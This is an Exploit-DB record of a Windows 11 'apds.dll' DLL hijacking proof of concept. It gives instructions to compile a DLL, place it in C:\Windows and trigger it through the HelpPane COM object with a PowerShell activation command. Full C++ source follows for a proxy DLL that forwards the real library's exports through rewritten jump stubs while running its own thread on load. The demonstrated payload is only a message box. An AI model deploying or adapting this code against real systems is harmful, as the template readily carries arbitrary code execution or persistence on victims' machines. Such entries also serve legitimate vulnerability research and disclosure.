{"source": "https://www.exploit-db.com/exploits/51733", "vulnName": "Microsoft Windows 11 - 'apds.dll' DLL hijacking (Forced)", "vulnEDBID": "51733", "vulnCVE": "N/A", "author": "MOEIN SHAHABI", "exploitType": "LOCAL", "platform": "WINDOWS", "datePublished": "2023-10-09", "vulnContent": " #---------------------------------------------------------\n# Title: Microsoft Windows 11 - 'apds.dll' DLL hijacking (Forced)\n# Date: 2023-09-01\n# Author: Moein Shahabi\n# Vendor: https://www.microsoft.com\n# Version: Windows 11 Pro 10.0.22621\n# Tested on: Windows 11_x64 [eng]\n\n#---------------------------------------------------------\n\n\nDescription:\n\nHelpPane object allows us to force Windows 11 to DLL hijacking \n\nInstructions:\n\n1. Compile dll\n2. Copy newly compiled dll \"apds.dll\" in the \"C:\\Windows\\\" directory \n3. Launch cmd and Execute the following command to test HelpPane object \"[System.Activator]::CreateInstance([Type]::GetTypeFromCLSID('8CEC58AE-07A1-11D9-B15E-000D56BFE6EE'))\"\n4. Boom DLL Hijacked!\n\n\n------Code_Poc-------\n#pragma once\n#include <Windows.h>\n\n\n\n// Function executed when the thread starts\nextern \"C\" __declspec(dllexport)\nDWORD WINAPI MessageBoxThread(LPVOID lpParam) {\n    MessageBox(NULL, L\"DLL Hijacked!\", L\"DLL Hijacked!\", NULL);\n    return 0;\n}\n\nPBYTE AllocateUsableMemory(PBYTE baseAddress, DWORD size, DWORD protection = PAGE_READWRITE) {\n#ifdef _WIN64\n    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;\n    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);\n    PIMAGE_OPTIONAL_HEADER optionalHeader = &ntHeaders->OptionalHeader;\n\n    // Create some breathing room\n    baseAddress = baseAddress + optionalHeader->SizeOfImage;\n\n    for (PBYTE offset = baseAddress; offset < baseAddress + MAXDWORD; offset += 1024 * 8) {\n        PBYTE usuable = (PBYTE)VirtualAlloc(\n            offset,\n            size,\n            MEM_RESERVE | MEM_COMMIT,\n            protection);\n\n        if (usuable) {\n            ZeroMemory(usuable, size); // Not sure if this is required\n            return usuable;\n        }\n    }\n#else\n    // x86 doesn't matter where we allocate\n\n    PBYTE usuable = (PBYTE)VirtualAlloc(\n        NULL,\n        size,\n        MEM_RESERVE | MEM_COMMIT,\n        protection);\n\n    if (usuable) {\n        ZeroMemory(usuable, size);\n        return usuable;\n    }\n#endif\n    return 0;\n}\n\nBOOL ProxyExports(HMODULE ourBase, HMODULE targetBase)\n{\n#ifdef _WIN64\n    BYTE jmpPrefix[] = { 0x48, 0xb8 }; // Mov Rax <Addr>\n    BYTE jmpSuffix[] = { 0xff, 0xe0 }; // Jmp Rax\n#else\n    BYTE jmpPrefix[] = { 0xb8 }; // Mov Eax <Addr>\n    BYTE jmpSuffix[] = { 0xff, 0xe0 }; // Jmp Eax\n#endif\n\n    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetBase;\n    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);\n    PIMAGE_OPTIONAL_HEADER optionalHeader = &ntHeaders->OptionalHeader;\n    PIMAGE_DATA_DIRECTORY exportDataDirectory = &optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];\n    if (exportDataDirectory->Size == 0)\n        return FALSE; // Nothing to forward\n\n    PIMAGE_EXPORT_DIRECTORY targetExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosHeader + exportDataDirectory->VirtualAddress);\n\n    if (targetExportDirectory->NumberOfFunctions != targetExportDirectory->NumberOfNames)\n        return FALSE; // TODO: Add support for DLLs with mixed ordinals\n\n    dosHeader = (PIMAGE_DOS_HEADER)ourBase;\n    ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);\n    optionalHeader = &ntHeaders->OptionalHeader;\n    exportDataDirectory = &optionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];\n    if (exportDataDirectory->Size == 0)\n        return FALSE; // Our DLL is broken\n\n    PIMAGE_EXPORT_DIRECTORY ourExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosHeader + exportDataDirectory->VirtualAddress);\n\n    // ----------------------------------\n\n    // Make current header data RW for redirections\n    DWORD oldProtect = 0;\n    if (!VirtualProtect(\n        ourExportDirectory,\n        64, PAGE_READWRITE,\n        &oldProtect)) {\n        return FALSE;\n    }\n\n    DWORD totalAllocationSize = 0;\n\n    // Add the size of jumps\n    totalAllocationSize += targetExportDirectory->NumberOfFunctions * (sizeof(jmpPrefix) + sizeof(jmpSuffix) + sizeof(LPVOID));\n\n    // Add the size of function table\n    totalAllocationSize += targetExportDirectory->NumberOfFunctions * sizeof(INT);\n\n    // Add total size of names\n    PINT targetAddressOfNames = (PINT)((PBYTE)targetBase + targetExportDirectory->AddressOfNames);\n    for (DWORD i = 0; i < targetExportDirectory->NumberOfNames; i++)\n        totalAllocationSize += (DWORD)strlen(((LPCSTR)((PBYTE)targetBase + targetAddressOfNames[i]))) + 1;\n\n    // Add size of name table\n    totalAllocationSize += targetExportDirectory->NumberOfNames * sizeof(INT);\n\n    // Add the size of ordinals:\n    totalAllocationSize += targetExportDirectory->NumberOfFunctions * sizeof(USHORT);\n\n    // Allocate usuable memory for rebuilt export data\n    PBYTE exportData = AllocateUsableMemory((PBYTE)ourBase, totalAllocationSize, PAGE_READWRITE);\n    if (!exportData)\n        return FALSE;\n\n    PBYTE sideAllocation = exportData; // Used for VirtualProtect later\n\n    // Copy Function Table\n    PINT newFunctionTable = (PINT)exportData;\n    CopyMemory(newFunctionTable, (PBYTE)targetBase + targetExportDirectory->AddressOfNames, targetExportDirectory->NumberOfFunctions * sizeof(INT));\n    exportData += targetExportDirectory->NumberOfFunctions * sizeof(INT);\n    ourExportDirectory->AddressOfFunctions = (DWORD)((PBYTE)newFunctionTable - (PBYTE)ourBase);\n\n    // Write JMPs and update RVAs in the new function table\n    PINT targetAddressOfFunctions = (PINT)((PBYTE)targetBase + targetExportDirectory->AddressOfFunctions);\n    for (DWORD i = 0; i < targetExportDirectory->NumberOfFunctions; i++) {\n        newFunctionTable[i] = (DWORD)(exportData - (PBYTE)ourBase);\n\n        CopyMemory(exportData, jmpPrefix, sizeof(jmpPrefix));\n        exportData += sizeof(jmpPrefix);\n\n        PBYTE realAddress = (PBYTE)((PBYTE)targetBase + targetAddressOfFunctions[i]);\n        CopyMemory(exportData, &realAddress, sizeof(LPVOID));\n        exportData += sizeof(LPVOID);\n\n        CopyMemory(exportData, jmpSuffix, sizeof(jmpSuffix));\n        exportData += sizeof(jmpSuffix);\n    }\n\n    // Copy Name RVA Table\n    PINT newNameTable = (PINT)exportData;\n    CopyMemory(newNameTable, (PBYTE)targetBase + targetExportDirectory->AddressOfNames, targetExportDirectory->NumberOfNames * sizeof(DWORD));\n    exportData += targetExportDirectory->NumberOfNames * sizeof(DWORD);\n    ourExportDirectory->AddressOfNames = (DWORD)((PBYTE)newNameTable - (PBYTE)ourBase);\n\n    // Copy names and apply delta to all the RVAs in the new name table\n    for (DWORD i = 0; i < targetExportDirectory->NumberOfNames; i++) {\n        PBYTE realAddress = (PBYTE)((PBYTE)targetBase + targetAddressOfNames[i]);\n        DWORD length = (DWORD)strlen((LPCSTR)realAddress);\n        CopyMemory(exportData, realAddress, length);\n        newNameTable[i] = (DWORD)((PBYTE)exportData - (PBYTE)ourBase);\n        exportData += length + 1;\n    }\n\n    // Copy Ordinal Table\n    PINT newOrdinalTable = (PINT)exportData;\n    CopyMemory(newOrdinalTable, (PBYTE)targetBase + targetExportDirectory->AddressOfNameOrdinals, targetExportDirectory->NumberOfFunctions * sizeof(USHORT));\n    exportData += targetExportDirectory->NumberOfFunctions * sizeof(USHORT);\n    ourExportDirectory->AddressOfNameOrdinals = (DWORD)((PBYTE)newOrdinalTable - (PBYTE)ourBase);\n\n    // Set our counts straight\n    ourExportDirectory->NumberOfFunctions = targetExportDirectory->NumberOfFunctions;\n    ourExportDirectory->NumberOfNames = targetExportDirectory->NumberOfNames;\n\n    if (!VirtualProtect(\n        ourExportDirectory,\n        64, oldProtect,\n        &oldProtect)) {\n        return FALSE;\n    }\n\n    if (!VirtualProtect(\n        sideAllocation,\n        totalAllocationSize,\n        PAGE_EXECUTE_READ,\n        &oldProtect)) {\n        return FALSE;\n    }\n\n    return TRUE;\n}\n// Executed when the DLL is loaded (traditionally or through reflective injection)\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n)\n{\n    HMODULE realDLL;\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        CreateThread(NULL, NULL, MessageBoxThread, NULL, NULL, NULL);\n        realDLL = LoadLibrary(L\"C:\\\\Windows\\\\System32\\\\apds.dll\");\n        if (realDLL)\n            ProxyExports(hModule, realDLL);\n\n\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n--------------------------\n            "}